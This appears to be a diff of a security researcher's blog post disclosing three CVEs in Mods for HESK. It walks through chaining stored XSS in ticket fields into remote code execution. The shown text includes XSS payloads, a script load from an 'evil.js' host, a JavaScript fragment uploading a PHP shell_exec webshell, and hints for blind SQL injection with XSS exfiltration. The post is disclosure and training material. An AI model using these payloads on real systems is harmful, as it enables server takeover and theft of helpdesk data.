@@ -35,70 +35,93 @@
   <time datetime="2020-06-25T23:30:00+00:00" class="by-line">
      Thursday, June 25th , 2020</time>
 
-<p>I am sharing this believing it could serve as some extra "material" for the Advanced Web Attacks and Exploitation <span class="paranthesis">(AWAE)</span> course and Offensive Security Web Expert <span class="paranthesis">(OSWE)</span> exam. I found a lot of similarities with the applications in the AWAE course and therefore believe it would be a nice addition to exam preparation. If you want the most out of this, I suggest you download and install Mods for HESK <span class="paranthesis">(MFH)</span> 2019.1.0 yourself, and postpone the reading of this blogpost. Spoiler alert: I go through XSS to RCE in detail, but I leave the SQL injection as an exercise</p>
+<h2>Background:</h2>
+<p>The discovered vulnerabilities resulted in three different CVE's for Mods for HESK <span class="paranthesis">(MFH)</span> version 2019.1.0 and down to version 3.1.0 <span class="paranthesis">(June 28 2017)</span></p>
+<ul>
+  <li>CVE-2020-13992 :: Stored XSS issues allows remote unauthenticated attacker to abuse a helpdesk user's logged in session</li>
+  <li>CVE-2020-13993 :: A blind SQL injection issue allows remote unauthenticated attackers to retrieve information from the database via ticket submission</li>
+  <li>CVE-2020-13994 :: A privileged user can achieve code execution on the server because of improper access control of uploaded resources. This might be exploitable in conjunction with CVE-2020-13992</li>
+</ul>
+<p>CVE-2020-13992 and CVE-2020-13994 can be chained toghether as you will see in this post.</p>
+
+<h2>The path to RCE:</h2>
+
+<p>I am sharing this believing it could serve as some extra "material" for the Advanced Web Attacks and Exploitation <span class="paranthesis">(AWAE)</span> course and Offensive Security Web Expert <span class="paranthesis">(OSWE)</span> exam. I found a lot of similarities with the applications in the AWAE course and therefore believe it would be a nice addition to exam preparation. If you want the most out of this, I suggest you download and install Mods for HESK <span class="paranthesis">(MFH)</span> 2019.1.0 yourself, and postpone the reading of this blogpost. Spoiler alert: I go through XSS <span class="paranthesis">(CVE-2020-13992)</span> to RCE <span class="paranthesis">(CVE-2020-13994)</span> in detail, but I leave the SQL injection <span class="paranthesis">(CVE-2020-13993)</span> as an exercise</p>
 
 <p>At one point in time <span class="paranthesis">(May/June 2020)</span> I looked into an installation of PHP helpdesk software, HESK 2.8.6 <span class="paranthesis">(open source)</span> with "Mods for HESK 2019.1.0" <span class="paranthesis">(latest version at that time)</span> installed. Open source is great for security researchers and also hackers. So I downloaded the latest version <span class="paranthesis">(2.8.6)</span> of HESK2 and started code review on parts that accepted user-input. After a couple of hours, this did not reveal any vulnerabilities <span class="paranthesis">(at least for my eyes)</span>. I get the feeling "there is nothing here". I thought to myself that I'm not going to find anything in the mod software, completely forgetting how powerful mods can be in the open source world. They can easily modify core parts of the software.</p>
 
 <p>I Downloaded Mods for HESK 2019.1.0 and went for the install directory. As with the HESK software this also refuses to run unless you remove the install directory after installation, which is great practice in my opinion. I logged in to the admin area to look around - taking the "tour". This is always a good way to start - get familiar with the app you are testing or code-reviewing.</p>
 
-<p>In my exploration of the app I noticed the possibility of uploading attachments is enabled by default. I also discovered the UI colors part of MFH addon in settings, making a note of the possibility to add images to the UI. I wanted a way in so I kept looking at user input, especially where a anonymous user could submit a ticket with file upload. Burp was already enabled and willing, so I submitted a ticket:</p>
+<a href="../assets/0-application.png"><img src="../assets/0-application.png" alt=""></a>
 
-<p><img src="../assets/1-burp.png" alt=""></p>
+<p>This is what it looks like when opening up hesk with MFH installed. Well except for the "hello@loco" in the Email field <span class="paranthesis">(yes, I am to lazy to edit the screenshot again, sorry)</span>. While getting to know the application I logged in with the admin user created at install time.</p>
+
+<a href="../assets/0a-login.png"><img src="../assets/0a-login.png" alt=""></a>
+
+<p>After logging in, I quickly found settings page.</p>
+<a href="../assets/0b-settings-attachments.png"><img src="../assets/0b-settings-attachments.png" alt=""></a>
+<a href="../assets/0c-settings-useragent.png"><img src="../assets/0c-settings-useragent.png" alt=""></a>
+<p>In my exploration of the logged-in portions of the app I noticed that the possibility of uploading attachments is enabled by default. In settings I discovered that allowed file extensions for upload was configurable. That is interesting. I also discovered a "show useragent" option within the Helpdesk section <span class="paranthesis">(not enabled by default)</span>. Hmmm. Further there is a UI colors section part of MFH addon - with image upload support! I wanted a way in so I kept looking at user input, especially where a anonymous user could submit a ticket with file upload. Burp was already enabled and willing, so I logged out of the admin area and submitted a ticket: <span class="paranthesis">(disregarding the file upload for now)</span></p>
+
+<a href="../assets/0d-ticket.png"><img src="../assets/0d-ticket.png" alt=""></a>
+<a href="../assets/1-burp.png"><img src="../assets/1-burp.png" alt=""></a>
 
 <p>I notice 4 fields not present in original HESK. That is interesting. Figuiring <code>screen_resolution_height</code> and <code>screen_resolution_width</code> would not get me anywhere as they are pure integers I focus on <code>latitude</code> and <code>longitude</code>. Although I am somewhat familiar with the HESK software source at this point, I find it quicker and more exciting to test XSS payload through Burp and check the page source where I expect these values to be displayed / used.</p>
 
 <p><code>&lt;script&gt;alert('latitude')&lt;/script&gt;</code></p>
 <p><code>&lt;script&gt;alert('longitude')&lt;/script&gt;</code></p>
 
-<p><img src="../assets/2-burp-xss.png" alt=""></p>
+<a href="../assets/2-burp-xss.png"><img src="../assets/2-burp-xss.png" alt=""></a>
 
 <p>So that is what I do, I inject both longitude and latitude with the "standard basic" XSS payload. I ship it and response says:
-Your ticket has been successfully submitted! Ticket ID: Q95-JAY-H8LZ. So far so good, now I will log into the helpdesk and view the ticket. It always tingles in my stomach when I see this:</p>
+Your ticket has been successfully submitted! Ticket ID: Q95-JAY-H8LZ. So far so good, now I will log into the helpdesk and view the ticket.</p>
 
-<p><img src="../assets/3-xss-success-longitude.png" alt=""></p>
+<a href="../assets/2b-ticket-overview.png"><img src="../assets/2b-ticket-overview.png" alt=""></a>
 
-<p>Well, longitude is injectable, but why didn't the latitude payload fire?
+<a href="../assets/3-xss-success-longitude.png"><img src="../assets/3-xss-success-longitude.png" alt=""></a>
+
+<p>It always tingles in my stomach when I see this. Well, longitude is injectable, but why didn't the latitude payload fire?
 Inspecting the page source it is revealed that we actually land directly into JavaScript and there is no need for script tags. The script tags actually broke the latitude injection and the rest of JavaScript after longitude. This is also what devtools and console is telling us:</p>
 
-<p><img src="../assets/4-source-xss.png" alt=""></p>
-<p><img src="../assets/5-devtools-xss.png" alt=""></p>
+<a href="../assets/4-source-xss.png"><img src="../assets/4-source-xss.png" alt=""></a>
+<a href="../assets/5-devtools-xss.png"><img src="../assets/5-devtools-xss.png" alt=""></a>
 
 <p>Let us fix it by chaning payloads to:</p>
 <p><code>1;alert('stored XSS are the best!')</code></p>
 <p><code>1;alert('but how much space is available?')</code></p>
 
-<p><img src="../assets/6-burp-xss.png" alt=""></p>
+<a href="../assets/6-burp-xss.png"><img src="../assets/6-burp-xss.png" alt=""></a>
 <p>I rip out all cookies (to avoid the <code>$_SESSION['already_submitted']</code> to ever become set) and ship it!
 I get another ticket Q2U-JDN-YXDU! Clicking the ticket in the admin panel...</p>
 
-<p><img src="../assets/7-xss.png" alt=""></p>
-<p><img src="../assets/8-xss.png" alt=""></p>
+<a href="../assets/7-xss.png"><img src="../assets/7-xss.png" alt=""></a>
+<a href="../assets/8-xss.png"><img src="../assets/8-xss.png" alt=""></a>
 <p>Perfect! It blends in beautifully.</p>
 <p>Yes yes, I know what you are thinking, can we steal the session cookie?
 Nope, not in the latest version of MFH at least. So what CAN we do?</p>
-<p><img src="../assets/9-http-only.png" alt=""></p>
+<a href="../assets/9-http-only.png"><img src="../assets/9-http-only.png" alt=""></a>
 <p>In my previous research into HESK, I noticed upload attachment functionality.
 As an admin you can change allowed extensions for attachment upload. Music in hacker ears! Craft XSS to change settings to allow for php file upload, submit ticket with attachment and use XSS in the ticket to determine the filename - then go for it and we have RCE! Always test your train of thought manually before typing up the script to attack. I did and I am glad. Cause there was something very nice lurking in the source:</p>
-<p><img src="../assets/10-attachments.png" alt=""></p>
+<a href="../assets/10-attachments.png"><img src="../assets/10-attachments.png" alt=""></a>
 
 <p>No PHP extension for you! Well, should the webserver execute php2, php6 or php7 you are in luck - but that is a conditional we cannot base an attack on. Remember the upload picture functionality in MFH UI addon? I quickly go to the bottom of the settings page and upload a file for Login Box Header image. I selected a cute little PHP file:</p>
 <p><code>&lt;?php echo "Stored XSS is sexy but I really <3 RCE"; ?&gt;</code></p>
 
 <p>Again, I could read the source to determined if this vector was possible, but I think is so much quicker just using the applications functions to test the first step in this direction, if not successful we would dig into source code.</p>
 
-<p><img src="../assets/11-burp-rce-upload.png" alt=""></p>
-<p><img src="../assets/12-admin-upload-success.png" alt=""></p>
-<p><img src="../assets/13-backdoor-location.png" alt=""></p>
+<a href="../assets/11-burp-rce-upload.png"><img src="../assets/11-burp-rce-upload.png" alt=""></a>
+<a href="../assets/12-admin-upload-success.png"><img src="../assets/12-admin-upload-success.png" alt=""></a>
+<a href="../assets/13-backdoor-location.png"><img src="../assets/13-backdoor-location.png" alt=""></a>
 
 <p>As you can see there is nothing stopping me from uploading a PHP file here.
 Navigating to the login screen, I find the picture, or at least its placeholder.
-finding the 'src' attribute reveals the backdoor being put into /cache folder.
+The 'src' attribute reveals the 'backdoor' being put into /cache folder.
 Opening it in another tabs gives us what every hacker wants, code execution on the webserver.</p>
-<p><img src="../assets/14-rce.png" alt=""></p>
+<a href="../assets/14-rce.png"><img src="../assets/14-rce.png" alt=""></a>
 
-<p>Now we know what we want, but how can we achieve it, can we bring the entire JavaScript payload into the database? We run into the hesk databse: <code>mysql -u root</code> and <code>use hesk;</code> then <code>describe hesk_tickets;</code>. This reveals that we have 100 characters to play with in each of longitude and latitude. Well, we could probably get away with that, but I don't have time for micro-optimizing code although a really enjoy it.</p>
+<p>Now we know what we want, but how can we achieve it, can we bring the entire JavaScript payload into the database? We run into the hesk databse: <code>mysql -u root</code> and <code>use hesk;</code> then <code>describe hesk_tickets;</code>. This reveals that we have 100 characters to play with in each of longitude and latitude. Well, we could probably get away with that <span class="paranthesis">(Psst! User-agent header is vulnerable to XSS too - and its type in DB is TEXT!)</span>, but I don't have time for micro-optimizing code although a really enjoy it. We could also base64 code some payload data in either of the visible ticket fields, but that wouldn't be very stealthy...</p>
 
-<p><img src="../assets/15-mysql.png" alt=""></p>
+<a href="../assets/15-mysql.png"><img src="../assets/15-mysql.png" alt=""></a>
 
 <p>We will cross the CSP bypass <span class="paranthesis">(for instance by leveraging attachments :D)</span> bridge some other day, for now I will settle with loading an external script. There is a thousand ways to do it, but I went for <span class="paranthesis">(localhost works here because I am attacking the webapp installed locally)</span>: </p>
 <p><code>1;&lt;/script&gt;&lt;script src='http://localhost/js/evil.js'/&gt;&lt;script&gt;//</code></p> 
@@ -151,6 +174,9 @@ There we have it, a stealthy gh0st exploit resulting in RCE on target webserver!
 
 <p>Imagine the ticket is automatically assigned to a limited user. If that is the case, we can reassign it to an admin user :D.
 Doing some more research reveals that the send message to other users' page actually seems to list all registered users of the HESK admin area.</p>
+
+<a href="../assets/15b-message-others.png"><img src="../assets/15b-message-others.png" alt=""></a>
+
 <p>That's helpful, what's more - the userid is exposed as well. Unless someone has messed greatly with the installation of HESK, userid 1 will always be an admin user. It cannot be deleted nor demoted.</p>
 <p>Further XSS seems impossible in these fields, but looking at the mail.php <code>$_SESSION['mail']['message'] = hesk_makeURL($_SESSION['mail']['message']);</code> tells us that url's will be Interpreted as links.
 
@@ -255,7 +281,7 @@ Armed with this knowledge, we make our payload request the admin/mail.php page t
           var blob = new Blob(["&lt;?php echo shell_exec('id'); ?&gt;"], {
             type: 'application/x-php'
           });
-          fd.set('login-box-header-image', blob, 'whatever.php');
+          fd.set('login-box-header-image', blob, 'whateverSTILLdontmatter.php'); /* Check it out: https://www.youtube.com/watch?v=w8QH93jWZbk */
           $.ajax({
             url: $(f).attr('action'),
             data: fd,
@@ -344,11 +370,44 @@ if __name__ == "__main__":
 
 </pre>
 
+<p>So what does it finally look like? </p>
+<p>We run the script: <code>python ticketXXs.py http://localhost/ http://localhost/js/evil.js</code>. This is an example with a very limited user that cannot even reassign tickets:</p>
+
+<a href="../assets/16b-limited-user.png"><img src="../assets/16b-limited-user.png" alt=""></a>
+
+<p>Limited user opens his newly assigned ticket, javascript executes - cannot assign admin, so phish options is automatically selected:</p>
+
+<a href="../assets/16c-limited-user.png"><img src="../assets/16c-limited-user.png" alt=""></a>
+
+<p>Admin user has a new message:</p>
+
+<a href="../assets/17-admin-new-message.png"><img src="../assets/17-admin-new-message.png" alt=""></a>
+
+<p>Admin user clicks the link to the infected ticket:</p>
+
+<a href="../assets/18-admin-phish.png"><img src="../assets/18-admin-phish.png" alt=""></a>
+
+<p>Admin has privileges to upload UI image, pwned:</p>
+
+<a href="../assets/19-admin-pwned.png"><img src="../assets/19-admin-pwned.png" alt=""></a>
+
+<p>Remote Code Execution:</p>
+
+<a href="../assets/20-rce.png"><img src="../assets/20-rce.png" alt=""></a>
+
 <p>Note that this will not work if the target has some kind of captcha enabled <span class="paranthesis">(not enabled by default)</span>. But that is just one request for you to send via Burp if need be. At last, remember the <code>screen_resolution_height</code> and <code>screen_resolution_width</code> in submit_ticket.php?
 Well, they are actually both vulnerable to SQL injection. We did not need this vulnerability to bypass authentication here. This attack should work on Mods for HESK versions between -2019.1.0- and -June 28 2017 Version 3.1.0- as these are vulnerable to SQL injection, XSS and RCE.</p>
 
 <p>What if RCE is out of the picture? For example in versions below 3.1.0 there are no UI image upload functionality.
-Well, we can still bypass authentication with session riding. But what if we need to log in as admin user? Here the SQL injection vector becomes interesting. I leave it as an exercise for AWAE students <span class="paranthesis">(and anyone else of course)</span> to leverage SQL injection to add admin password hash to a ticket and XSS to exfiltrate  the data to build a autologin token for the admin user. A hint: You will need to submit at least 4 <span class="paranthesis">(please correct me if I am wrong)</span> evil tickets, and collect at least one of the ticket ID's.</p>
+Well, we can still bypass authentication with session riding. But what if we need to log in as admin user? Here the SQL injection vector becomes interesting. I leave it as an exercise for AWAE students <span class="paranthesis">(and anyone else of course)</span> to leverage SQL injection to add admin password hash to a ticket and XSS to exfiltrate  the data to build a autologin token for the admin user. A couple of hints: <a href="https://twitter.com/loca1GH0ST"><span class="paranthesis">(DM me if you need a push in the right direction)</span></a>
+<ul>
+  <li>Remember that "show useragent" is not enabled by default</li>
+  <li>Conditional-based rest for the wicked <span class="paranthesis">(SLEEP(X) will work, but that is going to be a whole lot of tickets - poor helpdesk - and poor you if captcha is enabled. Still a valid option if you have no XSS)</span></li>
+  <li>SQL injection needs to result in an INT type, signed.</li>
+  <li>You will need to submit at least 6 <span class="paranthesis">(please correct me if I am wrong)</span> evil tickets for username and password hash and collect at least one of the ticket ID's</li>
+  <li>SQL is very very blind. You should leverage XSS to exfiltrate the data</li>
+</ul>
+</p>
 
 <p>In closing I would like to say that these vulnerabilities are serious as an attacker can exfiltrate all data on every ticket ever submitted and further reply to these tickets with malicious payloads in form of attachments. The vulnerabilities were reported quickly to the software author which in turn responded promptly and professionally. I would strongly recommend users of this software to update to the latest version of MFH - Mods for HESK and if possible, make the transition into the original HESK as the MFH is no longer maintained.</p>
 
